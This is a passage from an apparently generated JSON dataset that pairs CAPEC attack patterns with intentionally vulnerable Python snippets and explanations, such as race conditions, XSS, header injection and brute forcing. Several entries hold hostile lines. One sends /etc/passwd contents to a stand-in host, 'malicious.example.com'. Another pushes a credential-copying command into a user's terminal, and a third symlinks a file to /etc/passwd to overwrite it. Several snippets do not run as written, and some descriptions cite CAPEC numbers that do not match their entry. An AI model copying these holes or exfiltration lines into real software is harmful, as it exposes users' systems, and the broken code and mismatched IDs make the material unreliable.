        "code_snippet": "import os\nimport threading\nimport time\n\n# Shared resource\nfile_path = 'shared_file.txt'\n\n# Function to write to the file\ndef write_to_file():\n    with open(file_path, 'w') as f:\n        f.write('Original content')\n    time.sleep(1)  # Simulate some delay\n\n# Function to replace the file\ndef replace_file():\n    time.sleep(0.5)  # Ensure this runs during the write_to_file delay\n    os.remove(file_path)\n    with open(file_path, 'w') as f:\n        f.write('Malicious content')\n\n# Create threads\nthread1 = threading.Thread(target=write_to_file)\nthread2 = threading.Thread(target=replace_file)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()\n\n# Read the file content\nwith open(file_path, 'r') as f:\n    print(f.read())",
        "description": "This Python code snippet demonstrates a race condition vulnerability. The `write_to_file` function writes 'Original content' to a shared file, while the `replace_file` function replaces the file with one containing 'Malicious content'. Both functions are executed in separate threads, creating a race condition. The `replace_file` function is timed to run during the delay in `write_to_file`, exploiting the race condition to replace the file content. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and illustrates CWE-363 (Race Condition Enabling Link Following) and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport time\nimport tempfile\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file_name = tmp_file.name\n\n# Simulate a delay to create a race condition window\nprint(f\"Temporary file created: {tmp_file_name}\")\ntime.sleep(2)  # Time window for the attacker to create a symlink\n\n# Attacker creates a symlink to a sensitive file\nsensitive_file = '/etc/passwd'\nos.symlink(sensitive_file, tmp_file_name)\n\n# Privileged operation that writes to the temporary file\nwith open(tmp_file_name, 'w') as tmp_file:\n    tmp_file.write('malicious content')\n\nprint(f\"Sensitive file {sensitive_file} potentially overwritten.\")",
        "description": "This Python code snippet demonstrates a race condition vulnerability involving symbolic links (symlinks). The code creates a temporary file and then introduces a delay to simulate a race condition window. During this window, an attacker can create a symlink from the temporary file to a sensitive file (e.g., '/etc/passwd'). When the privileged operation writes to the temporary file, it actually writes to the sensitive file due to the symlink, potentially overwriting it with malicious content. This example embodies the main idea of the CAPEC by leveraging a race condition and symlink to write to a sensitive file, illustrating CWE-367 (TOCTOU Race Condition) and CWE-61 (UNIX Symlink Following)."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import random\n\n# Function that simulates processing user input\ndef process_input(user_input):\n    try:\n        # Simulate a command execution with user input\n        command = f\"echo {user_input}\"\n        result = os.popen(command).read()\n        return result\n    except Exception as e:\n        return str(e)\n\n# Fuzzing function to generate random inputs\ndef fuzzing_test():\n    for _ in range(100):  # Simulate 100 fuzzing attempts\n        # Generate random input\n        fuzz_input = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()', k=10))\n        print(f\"Testing with input: {fuzz_input}\")\n        result = process_input(fuzz_input)\n        print(f\"Result: {result}\")\n\nif __name__ == \"__main__\":\n    fuzzing_test()",
        "description": "This Python code snippet demonstrates a basic fuzzing attack to identify weaknesses in a system. The `process_input` function simulates processing user input by constructing and executing a command using the input. This is vulnerable to CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) and CWE-20 (Improper Input Validation) as it directly incorporates user input into a command without proper sanitization. The `fuzzing_test` function generates random inputs and tests the `process_input` function to uncover potential vulnerabilities. This approach embodies the main idea of CAPEC-28 (Fuzzing) by treating the system as a black box and using random inputs to identify weaknesses."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\nimport time\nimport threading\n\ndef check_and_use_file(filename):\n    # Time of Check\n    if os.path.exists(filename):\n        print(f\"{filename} exists. Checking permissions...\")\n        # Simulate some delay\n        time.sleep(1)\n        # Time of Use\n        with open(filename, 'r') as file:\n            data = file.read()\n            print(f\"Read data: {data}\")\n\ndef malicious_action(filename):\n    # Wait for the main thread to check the file\n    time.sleep(0.5)\n    # Replace the file with a malicious one\n    with open(filename, 'w') as file:\n        file.write(\"Malicious content\")\n    print(f\"{filename} has been replaced with malicious content.\")\n\nfilename = 'example.txt'\n# Create an initial file\nwith open(filename, 'w') as file:\n    file.write(\"Original content\")\n\n# Start the main thread that checks and uses the file\nmain_thread = threading.Thread(target=check_and_use_file, args=(filename,))\n# Start the malicious thread that replaces the file\nmalicious_thread = threading.Thread(target=malicious_action, args=(filename,))\n\nmain_thread.start()\nmalicious_thread.start()\n\nmain_thread.join()\nmalicious_thread.join()",
        "description": "This Python code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The `check_and_use_file` function checks if a file exists and then reads its content after a delay. Meanwhile, the `malicious_action` function waits for a short period and then replaces the file with malicious content. This creates a race condition where the file's state changes between the check and the use, potentially leading to unexpected behavior. This example embodies the main idea of CAPEC-367 and related CWEs, highlighting the risks of improper synchronization and race conditions in concurrent execution."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport os\nimport time\nimport threading\n\n# Vulnerable function that simulates a privileged operation\ndef privileged_operation():\n    while True:\n        print(\"Performing privileged operation...\")\n        time.sleep(1)\n\n# Function to hijack the privileged thread\ndef hijack_thread(thread_id):\n    # Suspend the thread\n    ctypes.windll.kernel32.SuspendThread(thread_id)\n    # Inject malicious code (simulated by changing the thread context)\n    print(\"Thread hijacked! Executing malicious code...\")\n    # Resume the thread\n    ctypes.windll.kernel32.ResumeThread(thread_id)\n\n# Start the privileged operation in a separate thread\nprivileged_thread = threading.Thread(target=privileged_operation)\nprivileged_thread.start()\n\n# Give the thread some time to start\ntime.sleep(2)\n\n# Hijack the privileged thread\nhijack_thread(ctypes.windll.kernel32.GetCurrentThreadId())",
        "description": "This Python code snippet demonstrates a simplified version of hijacking a privileged thread of execution. The `privileged_operation` function simulates a continuous privileged task. The `hijack_thread` function suspends the thread, simulates injecting malicious code, and then resumes the thread. This represents the CAPEC concept of hijacking a privileged thread to execute malicious code. The code also touches on related CWEs such as improper privilege management (CWE-270), process control (CWE-114), and race conditions (CWE-362) by manipulating thread execution and context."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Simulate user validation\n    if username == 'admin' and password == 'password':\n        # Create a cookie with sensitive information\n        resp = make_response('Logged in')\n        cookie_value = f'{username}:{password}'\n        resp.set_cookie('session', cookie_value)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_cookie = request.cookies.get('session')\n    if session_cookie:\n        username, password = session_cookie.split(':')\n        # Simulate user validation\n        if username == 'admin' and password == 'password':\n            return 'Welcome to the dashboard'\n    return 'Access denied', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple Flask web application that demonstrates the vulnerabilities described in the CAPEC. The application has two routes: '/login' and '/dashboard'. In the '/login' route, user credentials are validated, and if correct, a session cookie containing the username and password in cleartext is set. This embodies CWE-315 (Cleartext Storage of Sensitive Information in a Cookie) and CWE-539 (Use of Persistent Cookies Containing Sensitive Information). The '/dashboard' route retrieves the session cookie and validates the user based on the cookie's content, demonstrating CWE-565 (Reliance on Cookies without Validation and Integrity Checking) and CWE-642 (External Control of Critical State Data). This code is vulnerable to attacks such as cookie interception, modification, and session hijacking, illustrating the main idea of the CAPEC."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    # Vulnerable to XSS: directly embedding user input into HTML without proper sanitization\n    html_content = f'<h1>Search Results for: {query}</h1>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) through HTTP query strings. The application has a single route '/search' that takes a query parameter 'q' from the URL. The value of 'q' is directly embedded into the HTML content without any sanitization or escaping, making it susceptible to XSS attacks. An attacker can craft a URL with malicious script code in the query string, which will be executed in the victim's browser when they visit the URL. This example embodies the main idea of the CAPEC by showing how improper neutralization of user input can lead to XSS vulnerabilities, as described in the related CWEs."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import socket\n\n# Simulate a vulnerable HTTP proxy\nclass VulnerableProxy:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n\n    def start(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind((self.host, self.port))\n            s.listen(5)\n            while True:\n                client_socket, addr = s.accept()\n                with client_socket:\n                    request = client_socket.recv(1024).decode('utf-8')\n                    if request:\n                        self.handle_request(client_socket, request)\n\n    def handle_request(self, client_socket, request):\n        # Forward the request to the backend server\n        backend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        backend_socket.connect(('backend.server', 80))\n        backend_socket.sendall(request.encode('utf-8'))\n\n        # Receive the response from the backend server\n        response = backend_socket.recv(4096)\n        backend_socket.close()\n\n        # Send the response back to the client\n        client_socket.sendall(response)\n\nif __name__ == '__main__':\n    proxy = VulnerableProxy('0.0.0.0', 8080)\n    proxy.start()",
        "description": "This Python code snippet demonstrates a simple HTTP proxy that is vulnerable to HTTP Request Smuggling attacks. The proxy listens for incoming HTTP requests and forwards them to a backend server without properly validating or sanitizing the requests. This can lead to various attacks, such as HTTP Request Smuggling, where an attacker can craft malicious HTTP requests that are interpreted differently by the proxy and the backend server. The code also touches on related CWEs, such as improper neutralization of CRLF sequences (CWE-113) and inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    user_input = request.args.get('input', '')\n    response = make_response('Hello, ' + user_input)\n    response.headers['Content-Type'] = 'text/html; charset=UTF-8'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to HTTP Response Splitting. The vulnerability arises because the user input is directly included in the HTTP response without proper neutralization of special characters like CR (Carriage Return) and LF (Line Feed). An attacker can exploit this by injecting CRLF sequences into the 'input' parameter, causing the server to split the HTTP response and potentially inject malicious headers or content. This example embodies the main idea of CAPEC-34 (HTTP Response Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\nimport json\n\ndef load_config(file_path):\n    with open(file_path, 'r') as file:\n        config = json.load(file)\n    return config\n\ndef execute_command(command):\n    os.system(command)\n\n# Simulate loading a configuration file\nconfig = load_config('config.json')\n\n# Vulnerable code: directly using a configuration parameter to execute a command\nexecute_command(config['command'])",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can leverage executable code in non-executable files, specifically a configuration file. The `load_config` function reads a JSON configuration file, and the `execute_command` function executes a system command. The vulnerability arises when the `execute_command` function directly uses a parameter from the configuration file (`config['command']`) without proper validation or sanitization. This can lead to code injection (CWE-94), as an attacker could modify the configuration file to include malicious commands. The code snippet embodies the main idea of the CAPEC by showing how trust in configuration files can be exploited to execute malicious code."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class HiddenFeature:\n    def __init__(self):\n        self._secret_data = \"Sensitive Information\"\n\n    def _hidden_method(self):\n        return self._secret_data\n\nclass PublicInterface:\n    def __init__(self):\n        self.hidden_feature = HiddenFeature()\n\n    def public_method(self):\n        return \"Public Information\"\n\n# Simulating an attacker discovering and invoking the hidden method\npublic_interface = PublicInterface()\n# Accessing the hidden method directly\nprint(public_interface.hidden_feature._hidden_method())",
        "description": "This Python code snippet demonstrates a scenario where an adversary can access unpublished interfaces or functionality. The `HiddenFeature` class contains a hidden method `_hidden_method` that returns sensitive information. The `PublicInterface` class is intended to expose only the `public_method`, but an attacker can discover and invoke the `_hidden_method` directly, bypassing any intended access controls. This example embodies the CAPEC of using unpublished interfaces or functionality and highlights related CWEs such as missing authentication (CWE-306), missing authorization (CWE-862), and inclusion of undocumented features (CWE-1242)."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\n\n# Sensitive data stored in cleartext\nsensitive_data = 'password123'\n\n# Store sensitive data in a file without encryption\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Improperly zeroize sensitive data before releasing the resource\nsensitive_data = None\n\n# Read the sensitive data from the file\nwith open('sensitive_data.txt', 'r') as file:\n    retrieved_data = file.read()\n\nprint(f'Retrieved Data: {retrieved_data}')\n\n# Clean up the file (not securely)\nos.remove('sensitive_data.txt')",
        "description": "This Python code snippet demonstrates the vulnerability of 'Retrieve Embedded Sensitive Data' by storing sensitive information (a password) in cleartext within a file. The code does not encrypt the sensitive data before storage (CWE-311) and does not properly zeroize the sensitive data before releasing the resource (CWE-226). Additionally, the sensitive data is stored in cleartext within a file (CWE-312). The code then reads the sensitive data from the file, demonstrating how an attacker could retrieve embedded sensitive data. Finally, the file is deleted, but this does not ensure that the data is securely removed from the system."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n# CWE-99: Improper Control of Resource Identifiers\n\n# Simulate an attacker-controlled environment variable\nos.environ['PATH'] = '/malicious/path:' + os.environ['PATH']\n\n# Function that executes a system command\n# This function is vulnerable because it relies on the PATH environment variable\n# which can be manipulated by an attacker\n\ndef execute_command(command):\n    os.system(command)\n\n# Example usage\n# This will execute the 'ls' command, but if there is a malicious 'ls' in the /malicious/path,\n# it will execute that instead of the legitimate 'ls' command\nexecute_command('ls')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can manipulate the PATH environment variable to execute malicious code. The code sets the PATH environment variable to include a directory controlled by the attacker. When the `execute_command` function is called with a command like 'ls', the system will search for the 'ls' executable in the directories listed in PATH. If a malicious 'ls' executable is found in the attacker's directory, it will be executed instead of the legitimate system command. This embodies the main idea of the CAPEC by showing how an attacker can leverage or manipulate configuration file search paths to execute malicious components. The related CWEs provide additional context on the types of vulnerabilities involved, such as untrusted search paths, uncontrolled search path elements, and improper control of resource identifiers."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "from flask import Flask, request, make_response\nimport base64\n\napp = Flask(__name__)\n\n# Simulated sensitive data stored in a cookie\n@app.route('/set_cookie')\ndef set_cookie():\n    user_data = 'user_id=1234;role=admin'\n    encoded_data = base64.b64encode(user_data.encode()).decode()\n    resp = make_response('Cookie is set')\n    resp.set_cookie('auth_token', encoded_data)\n    return resp\n\n# Endpoint that relies on the cookie without proper validation\n@app.route('/get_data')\ndef get_data():\n    auth_token = request.cookies.get('auth_token')\n    if auth_token:\n        decoded_data = base64.b64decode(auth_token).decode()\n        user_info = dict(item.split('=') for item in decoded_data.split(';'))\n        if user_info.get('role') == 'admin':\n            return 'Sensitive data for admin'\n        else:\n            return 'Sensitive data for user'\n    return 'No auth token found', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that sets and retrieves a cookie containing sensitive user information. The '/set_cookie' endpoint sets a base64-encoded cookie with user data, including a user ID and role. The '/get_data' endpoint retrieves this cookie and decodes it to determine the user's role, granting access to sensitive data based on the role. This code embodies the CAPEC 'Manipulating Opaque Client-based Data Tokens' by showing how an attacker could manipulate the cookie to gain unauthorized access. The code also highlights related CWEs, such as missing integrity checks (CWE-353), improper authorization (CWE-285), and reliance on cookies without validation (CWE-565)."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\nimport sys\n\n# Simulate an attacker writing to a terminal device\nattacker_input = \"\\ncat /etc/passwd > /tmp/stolen_passwd\\n\"\n\n# Vulnerable terminal device file (e.g., /dev/pts/1)\nterminal_device = \"/dev/pts/1\"\n\ntry:\n    with open(terminal_device, 'w') as terminal:\n        terminal.write(attacker_input)\nexcept Exception as e:\n    print(f\"Error writing to terminal device: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can write to a terminal device that is writable by other users. The attacker sends a command string to the target terminal device, hoping that the target user will execute the command, which in this case copies the contents of /etc/passwd to a temporary file. This embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as command injection (CWE-77, CWE-78) and exposure of sensitive information (CWE-214). The code is a simplified example to illustrate the concept and should not be used in a real environment."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    # Construct email headers\n    headers = f\"From: attacker@example.com\\nTo: {to_address}\\nSubject: {subject}\\n\"\n    \n    # Create the email message\n    msg = MIMEText(body)\n    msg['From'] = 'attacker@example.com'\n    msg['To'] = to_address\n    msg['Subject'] = subject\n    \n    # Injecting malicious payload via headers\n    malicious_payload = \"\\nBcc: victim@example.com\\nX-Exploit: <script>alert('Hacked!');</script>\"\n    headers += malicious_payload\n    \n    # Send the email\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail('attacker@example.com', [to_address], headers + msg.as_string())\n\n# Example usage\nsend_email('user@example.com', 'Test Subject', 'This is a test email body.')",
        "description": "This Python code snippet demonstrates a vulnerable email-sending function that constructs email headers without properly neutralizing meta-characters. The function `send_email` takes recipient address, subject, and body as inputs and constructs the email headers. It then appends a malicious payload to the headers, which includes a Bcc field and a script tag. This payload can be used to inject malicious behavior into email clients that do not properly handle such meta-characters. The code represents the main idea of CAPEC-150: Using Meta-characters in E-mail Headers to Inject Malicious Payloads, and highlights related weaknesses such as improper neutralization of escape sequences (CWE-150), improper encoding or escaping of output (CWE-116), and improper neutralization of HTTP headers for scripting syntax (CWE-644)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\nfrom email import policy\nfrom email.parser import BytesParser\n\n# Simulate receiving an email with MIME content\nraw_email = b\"\"\"MIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\n\nHello, this is a test email with a very long body. \" + b\"A\" * 10000 + b\"\"\n\n# Parse the email\nmsg = BytesParser(policy=policy.default).parsebytes(raw_email)\n\n# Extract the payload\npayload = msg.get_payload(decode=True)\n\n# Vulnerable buffer copy without checking size\nbuffer = bytearray(1024)  # Fixed size buffer\nfor i in range(len(payload)):\n    buffer[i] = payload[i]  # No bounds checking, potential overflow\n\nprint(\"Email processed.\")",
        "description": "This Python code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow, aligning with the CAPEC description. The code simulates receiving an email with MIME content and then parses it. The payload of the email is extracted and copied into a fixed-size buffer without checking the size of the input, which can lead to a buffer overflow (CWE-120). This example also touches on improper restriction of operations within the bounds of a memory buffer (CWE-119) and improper input validation (CWE-20), as the code does not validate the size of the payload before copying it into the buffer."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import os\n\n# First parser layer\nuser_input = input('Enter your command: ')\nparsed_input = user_input.replace('\\\\', '\\')  # First parsing layer\n\n# Input validation\nif ';' in parsed_input or '&&' in parsed_input:\n    raise ValueError('Invalid input detected!')\n\n# Second parser layer\nfinal_command = parsed_input.replace('\\', '')  # Second parsing layer\n\n# Execution of the command\nos.system(final_command)",
        "description": "This Python code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC-173). The code takes user input and processes it through multiple layers before executing it as an OS command. The first parser layer replaces double backslashes with a single backslash. The input validation step checks for dangerous characters like ';' and '&&' and raises an error if they are found. However, the second parser layer removes all backslashes, which can transform the input into a dangerous command that bypasses the initial validation. This illustrates how improper ordering of validation and parsing can lead to vulnerabilities such as command injection (CWE-77, CWE-78) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import struct\n\ndef process_binary_file(file_path):\n    try:\n        with open(file_path, 'rb') as f:\n            data = f.read()\n            # Assume the first 4 bytes represent the size of the buffer\n            buffer_size = struct.unpack('<I', data[:4])[0]\n            buffer = bytearray(buffer_size)\n            # Vulnerable copy operation without checking the actual size of data\n            for i in range(len(data) - 4):\n                buffer[i] = data[i + 4]\n            print('File processed successfully')\n    except Exception as e:\n        print(f'Error processing file: {e}')\n\n# Example usage\nprocess_binary_file('example.mp3')",
        "description": "This Python code snippet demonstrates a vulnerable function that processes a binary file, such as an MP3. The function reads the file and assumes the first 4 bytes represent the size of a buffer. It then allocates a buffer of that size and copies the rest of the file into this buffer without verifying the actual size of the data. This can lead to a buffer overflow if the file is crafted to have a larger size than the allocated buffer. This example embodies the main idea of the CAPEC 'Overflow Binary Resource File' and highlights CWE-120 (Classic Buffer Overflow) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file and a symbolic link to it\ntemp_file = tempfile.NamedTemporaryFile(delete=False)\nsymlink_path = temp_file.name + '_symlink'\nos.symlink(temp_file.name, symlink_path)\n\n# Function to read from a file and copy its contents to a buffer\ndef read_and_copy_file(file_path):\n    buffer = bytearray(100)  # Fixed-size buffer\n    with open(file_path, 'r') as f:\n        data = f.read()\n        # CWE-120: Buffer Copy without Checking Size of Input\n        buffer[:len(data)] = data  # Potential buffer overflow\n\n# Manipulate the symbolic link to point to a large file\nwith open(temp_file.name, 'w') as f:\n    f.write('A' * 200)  # Write 200 'A's to the file\n\n# Read from the symbolic link, causing a buffer overflow\nread_and_copy_file(symlink_path)\n\n# Clean up\ntemp_file.close()\nos.remove(temp_file.name)\nos.remove(symlink_path)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via symbolic links. It creates a temporary file and a symbolic link to it. The `read_and_copy_file` function reads the contents of the file and copies it to a fixed-size buffer without checking the size of the input, leading to a potential buffer overflow (CWE-120). The symbolic link is then manipulated to point to a file with a larger content than the buffer can handle, causing the overflow when the function is called. This example embodies the main idea of the CAPEC by leveraging symbolic links to cause buffer overflows."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import struct\n\ndef process_config(config_data):\n    buffer = bytearray(64)  # Fixed-size buffer\n    try:\n        # Simulate reading a tag from the configuration data\n        tag = config_data['tag']\n        # Vulnerable code: copying tag to buffer without size check\n        for i in range(len(tag)):\n            buffer[i] = tag[i]\n    except IndexError:\n        print('Buffer overflow detected!')\n\n# Malicious configuration data with oversized tag\nmalicious_config = {'tag': b'A' * 100}\nprocess_config(malicious_config)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability by processing a configuration data dictionary containing a 'tag'. The 'tag' is copied into a fixed-size buffer without checking its length, leading to a potential buffer overflow. The code attempts to handle an IndexError, which occurs when the 'tag' exceeds the buffer's size. This example embodies the main idea of the CAPEC 'Overflow Variables and Tags' and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Input must be a string')\n\n    # CWE-131: Incorrect Calculation of Buffer Size\n    buffer_size = len(user_input) * 2\n    buffer = [''] * buffer_size\n\n    # CWE-120: Buffer Copy without Checking Size of Input\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n\n    # Simulate parameter expansion\n    expanded_input = os.path.expandvars(''.join(buffer))\n\n    # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    for i in range(len(expanded_input)):\n        buffer[i] = expanded_input[i]  # Potential buffer overflow\n\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 50\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable function that processes user input and simulates parameter expansion, leading to a potential buffer overflow. The function first checks if the input is a string (CWE-20: Improper Input Validation). It then incorrectly calculates the buffer size (CWE-131: Incorrect Calculation of Buffer Size) by doubling the length of the input string. The input is copied into the buffer without checking if it fits (CWE-120: Buffer Copy without Checking Size of Input). The code then simulates parameter expansion using `os.path.expandvars`, which can increase the size of the input. Finally, it attempts to copy the expanded input back into the buffer, potentially causing a buffer overflow (CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer). This snippet embodies the main idea of CAPEC-Buffer Overflow via Parameter Expansion."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import requests\n\n# Function to fetch content from a URL or local file\ndef fetch_content(resource):\n    if resource.startswith('http://') or resource.startswith('https://'):\n        response = requests.get(resource)\n        return response.text\n    else:\n        with open(resource, 'r') as file:\n            return file.read()\n\n# Example usage\nresource = 'file:///etc/passwd'  # Local file path\ncontent = fetch_content(resource)\n\n# Send the content to an external server\nrequests.get('http://malicious.example.com', params={'data': content})",
        "description": "This Python code snippet demonstrates a vulnerability where a function fetches content from either a URL or a local file based on the input. The function `fetch_content` does not properly distinguish between URLs and local file paths, leading to potential exposure of local files. An attacker can exploit this by providing a local file path (e.g., 'file:///etc/passwd') instead of a URL, causing the function to read sensitive local files. The content of the local file is then sent to an external server using an HTTP GET request, which includes the sensitive data in the query string. This embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' and incorporates related CWEs such as improper handling of unexpected data types, reliance on file names, and use of GET requests with sensitive data."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import itertools\nimport string\n\n# Weak password requirements (CWE-521)\npasswords = ['password123', 'admin', '123456']\n\n# Function to simulate password brute force attack\ndef brute_force_attack(target_password):\n    characters = string.ascii_letters + string.digits + string.punctuation\n    for length in range(1, 9):  # Limiting to 8 characters for simplicity\n        for guess in itertools.product(characters, repeat=length):\n            guess = ''.join(guess)\n            if guess == target_password:\n                return guess\n    return None\n\n# Simulate brute force attack on a weak password\nfor password in passwords:\n    cracked_password = brute_force_attack(password)\n    if cracked_password:\n        print(f'Password \"{password}\" cracked as \"{cracked_password}\"')\n    else:\n        print(f'Failed to crack password \"{password}\"')",
        "description": "This Python code snippet demonstrates a simple brute force attack on a list of weak passwords, highlighting the vulnerability described in CAPEC-112 (Password Brute Forcing). The code uses itertools to generate all possible combinations of characters up to a length of 8, attempting to match each combination against the target password. The passwords list contains weak passwords (CWE-521), and the brute_force_attack function simulates the brute force process. This example underscores the importance of strong password policies and the risks associated with weak passwords."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\n# Weak password recovery mechanism\nusers = {\n    'user1': {'password': 'password123', 'security_answer': 'petname'},\n    'user2': {'password': 'mypassword', 'security_answer': 'mothermaidenname'}\n}\n\n# Function to recover password\ndef recover_password(username, security_answer):\n    if username in users and users[username]['security_answer'] == security_answer:\n        return users[username]['password']\n    else:\n        return 'Security answer incorrect'\n\n# Example usage\nusername = 'user1'\nsecurity_answer = 'petname'\nrecovered_password = recover_password(username, security_answer)\nprint(f'Recovered password for {username}: {recovered_password}')\n",
        "description": "This Python code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code stores user passwords in plaintext and uses a simple security question for password recovery. If an attacker knows or can guess the security answer, they can easily recover the user's password. This example highlights several related CWEs: CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-521 (Weak Password Requirements). The code is insecure because it allows easy exploitation of the password recovery feature, leading to unauthorized access."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulate a poisoned registry entry\npoisoned_registry_entry = '''\n<service>\n    <name>ExampleService</name>\n    <endpoint>http://malicious.example.com</endpoint>\n    <wsdl>http://malicious.example.com/service?wsdl</wsdl>\n</service>\n'''\n\n# Parse the poisoned registry entry\nroot = ET.fromstring(poisoned_registry_entry)\n\n# Extract endpoint and WSDL URL\nendpoint = root.find('endpoint').text\nwsdl_url = root.find('wsdl').text\n\n# Simulate a service request using the poisoned registry entry\nprint(f\"Connecting to service at {endpoint}\")\nprint(f\"Fetching WSDL from {wsdl_url}\")\n\n# Simulate improper authorization check\nuser_role = 'guest'\nif user_role != 'admin':\n    print(\"Access denied: insufficient permissions\")\nelse:\n    print(\"Access granted\")\n\n# Simulate cleartext storage in registry\nregistry = {}\nregistry['service_endpoint'] = endpoint\nregistry['service_wsdl'] = wsdl_url\nprint(f\"Registry stored: {registry}\")",
